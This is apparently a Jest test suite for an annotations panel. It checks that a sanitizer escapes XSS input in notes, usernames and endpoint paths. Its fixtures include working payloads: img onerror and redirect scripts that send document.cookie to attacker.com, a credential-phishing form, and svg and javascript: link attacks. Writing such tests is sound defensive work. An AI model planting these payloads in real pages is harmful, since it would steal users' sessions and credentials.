import { sanitizeAnnotationText, isSafeText } from '../../utils/sanitize';

describe('AnnotationsPanel: XSS Prevention', () => {
  describe('Annotation text sanitization', () => {
    it('sanitizes script injection in annotations', () => {
      const maliciousInput = '<script>alert("XSS in annotation")</script>This is a note';
      const sanitized = sanitizeAnnotationText(maliciousInput);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('This is a note');
      expect(isSafeText(sanitized)).toBe(true);
    });

    it('sanitizes img tag with onerror in annotations', () => {
      const maliciousInput =
        'Check this: <img src="x" onerror="fetch(\'http://attacker.com?data=\' + document.cookie)">';
      const sanitized = sanitizeAnnotationText(maliciousInput);

      // Should not have unescaped img tag
      expect(sanitized).not.toMatch(/<img[\s>]/i);
      expect(isSafeText(sanitized)).toBe(true);
    });

    it('sanitizes iframe injection in annotations', () => {
      const maliciousInput =
        'Visit this link: <iframe src="http://attacker.com/phishing"></iframe>';
      const sanitized = sanitizeAnnotationText(maliciousInput);

      expect(sanitized).not.toContain('iframe');
      expect(sanitized).not.toContain('attacker');
      expect(isSafeText(sanitized)).toBe(true);
    });

    it('preserves legitimate technical content', () => {
      const technicalContent = 'Use Content-Type: application/json in headers';
      const sanitized = sanitizeAnnotationText(technicalContent);

      // Forward slashes are escaped for safety, but content is preserved
      expect(sanitized).toContain('Content-Type');
      expect(sanitized).toContain('application');
      expect(sanitized).toContain('json');
      expect(isSafeText(sanitized)).toBe(true);
    });

    it('preserves code examples with angle brackets', () => {
      const codeExample = 'Compare: if (a < b && b > c) then return 404';
      const sanitized = sanitizeAnnotationText(codeExample);

      // Should escape the angle brackets
      expect(sanitized).toContain('a &lt; b');
      expect(sanitized).toContain('b &gt; c');
      expect(isSafeText(sanitized)).toBe(true);
    });

    it('sanitizes DOM manipulation attempts', () => {
      const maliciousInput =
        '<div onmouseover="document.body.innerHTML=\'<img src=x onerror=alert(1)>\'">hover</div>';
      const sanitized = sanitizeAnnotationText(maliciousInput);

      expect(sanitized).not.toContain('onmouseover');
      expect(sanitized).not.toContain('document.body');
      expect(isSafeText(sanitized)).toBe(true);
    });

    it('sanitizes CSS injection attempts', () => {
      const maliciousInput =
        '<style>body { background: url("javascript:alert(1)"); }</style>';
      const sanitized = sanitizeAnnotationText(maliciousInput);

      // Style tag should be escaped
      expect(sanitized).not.toMatch(/<style[\s>]/i);
      expect(isSafeText(sanitized)).toBe(true);
    });
  });

  describe('Username sanitization', () => {
    it('sanitizes XSS payloads in usernames', () => {
      const maliciousUsername = '<script>alert("XSS")</script>Alice';
      const sanitized = sanitizeAnnotationText(maliciousUsername);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
      expect(isSafeText(sanitized)).toBe(true);
    });

    it('preserves normal usernames', () => {
      const normalUsername = 'alice_dev_123';
      const sanitized = sanitizeAnnotationText(normalUsername);

      expect(sanitized).toBe(normalUsername);
      expect(isSafeText(sanitized)).toBe(true);
    });

    it('sanitizes img tags with event handlers in usernames', () => {
      const maliciousUsername = '<img src=x onerror=alert(1)>Bob';
      const sanitized = sanitizeAnnotationText(maliciousUsername);

      // Should not have unescaped img tag
      expect(sanitized).not.toMatch(/<img[\s>]/i);
      expect(sanitized).toContain('Bob');
      expect(isSafeText(sanitized)).toBe(true);
    });
  });

  describe('Stored XSS prevention', () => {
    it('prevents XSS through localStorage pollution', () => {
      // Simulate what happens with malicious input
      const attackerInput = '<img src=x onerror="window.location=\'http://attacker.com?c=\'+document.cookie">';

      // User input gets sanitized before storage
      const sanitized = sanitizeAnnotationText(attackerInput);

      // Simulate localStorage round-trip
      const stored = JSON.stringify({ text: sanitized, author: sanitizeAnnotationText('<script>alert(1)</script>Alice') });
      const retrieved = JSON.parse(stored);

      // Retrieved data should be safe
      expect(isSafeText(retrieved.text)).toBe(true);
      expect(isSafeText(retrieved.author)).toBe(true);

      // No dangerous patterns should exist
      expect(retrieved.text).not.toContain('<img');
      expect(retrieved.text).not.toContain('onerror');
      expect(retrieved.author).not.toContain('<script>');
    });

    it('prevents XSS cross-user attacks through shared localStorage', () => {
      const attackerAnnotation = '<svg onload=alert("XSS to other users")>Visit my site</svg>';
      const sanitized = sanitizeAnnotationText(attackerAnnotation);

      const attackerData = {
        id: '1',
        author: 'attacker',
        text: sanitized,
        timestamp: Date.now(),
      };

      // Simulate multiple users reading the same annotation
      const victimUser1 = JSON.parse(JSON.stringify(attackerData));
      const victimUser2 = JSON.parse(JSON.stringify(attackerData));

      // Neither user should be vulnerable to XSS
      expect(isSafeText(victimUser1.text)).toBe(true);
      expect(isSafeText(victimUser2.text)).toBe(true);
    });
  });

  describe('Endpoint path sanitization', () => {
    it('handles URL paths with query parameters safely', () => {
      const endpointPath = '/api/v1/users?filter=<script>';
      const sanitized = sanitizeAnnotationText(endpointPath);

      // Should not have unescaped script tag
      expect(sanitized).not.toContain('<script>');
      expect(isSafeText(sanitized)).toBe(true);
    });

    it('preserves normal API paths', () => {
      const normalPath = '/api/v1/transactions?status=completed&limit=10';
      const sanitized = sanitizeAnnotationText(normalPath);

      // Forward slashes and ampersands are escaped for safety, but the path is still readable
      expect(sanitized).toContain('api');
      expect(sanitized).toContain('transactions');
      expect(isSafeText(sanitized)).toBe(true);
    });
  });

  describe('Real-world attack scenarios', () => {
    it('defends against cookie theft via img tag', () => {
      const attackPayload =
        '<img src="x" onerror="fetch(\'https://attacker.com/steal?c=\' + encodeURIComponent(document.cookie))">';
      const sanitized = sanitizeAnnotationText(attackPayload);

      // Should not have unescaped img tag
      expect(sanitized).not.toMatch(/<img[\s>]/i);
      expect(isSafeText(sanitized)).toBe(true);
    });

    it('defends against localStorage hijacking', () => {
      const attackPayload =
        '<svg onload="localStorage.clear(); localStorage.setItem(\'annotations\', JSON.stringify([])); location.reload()">';
      const sanitized = sanitizeAnnotationText(attackPayload);

      // SVG tag should be escaped or dangerous attributes removed
      expect(isSafeText(sanitized)).toBe(true);
    });

    it('defends against redirect attacks', () => {
      const attackPayload =
        '<a href="javascript:window.location=\'http://attacker.com?origin=\'+location.href">Click here</a>';
      const sanitized = sanitizeAnnotationText(attackPayload);

      // The tag should be escaped, preventing parsing as HTML
      expect(sanitized).not.toMatch(/<a[\s>]/i);
      expect(isSafeText(sanitized)).toBe(true);
    });

    it('defends against form hijacking', () => {
      const attackPayload =
        '<form action="http://attacker.com/phish" method="POST"><input name="username"><input name="password" type="password"><input type="submit" value="Login"></form>';
      const sanitized = sanitizeAnnotationText(attackPayload);

      // The form tag should be escaped - no unescaped opening tag
      expect(sanitized).not.toMatch(/<form[\s>]/i);
      expect(isSafeText(sanitized)).toBe(true);
    });

    it('defends against event handler-based XSS', () => {
      const eventHandlers = [
        'onclick',
        'onmouseover',
        'onerror',
        'onload',
        'onfocus',
        'onchange',
        'onblur',
        'onkeydown',
        'onkeyup',
        'onsubmit',
      ];

      eventHandlers.forEach((handler) => {
        const payload = `<div ${handler}="alert('XSS')">text</div>`;
        const sanitized = sanitizeAnnotationText(payload);
        expect(sanitized).not.toContain(handler);
        expect(isSafeText(sanitized)).toBe(true);
      });
    });
  });

  describe('Data integrity after sanitization', () => {
    it('preserves annotation count after sanitization', () => {
      const annotations = [
        { text: 'Normal note' },
        { text: '<script>alert(1)</script>Hacked' },
        { text: 'Another note' },
      ];

      const sanitized = annotations.map((a) => ({
        ...a,
        text: sanitizeAnnotationText(a.text),
      }));

      expect(sanitized.length).toBe(annotations.length);
      sanitized.forEach((a) => expect(isSafeText(a.text)).toBe(true));
    });

    it('preserves non-malicious content through sanitization', () => {
      const benignAnnotations = [
        'This endpoint requires authentication',
        'Returns 404 if resource not found',
        'Rate limit: 100 requests per minute',
        'See documentation for schema details',
      ];

      benignAnnotations.forEach((text) => {
        const sanitized = sanitizeAnnotationText(text);
        expect(sanitized).toBe(text);
        expect(isSafeText(sanitized)).toBe(true);
      });
    });

    it('maintains search functionality after sanitization', () => {
      const maliciousAnnotation = '<img onerror=alert(1)>User needs API key';
      const sanitized = sanitizeAnnotationText(maliciousAnnotation);

      // Sanitized text should still be searchable for important keywords
      expect(sanitized.toLowerCase()).toContain('user');
      expect(sanitized.toLowerCase()).toContain('api key');
    });
  });
});
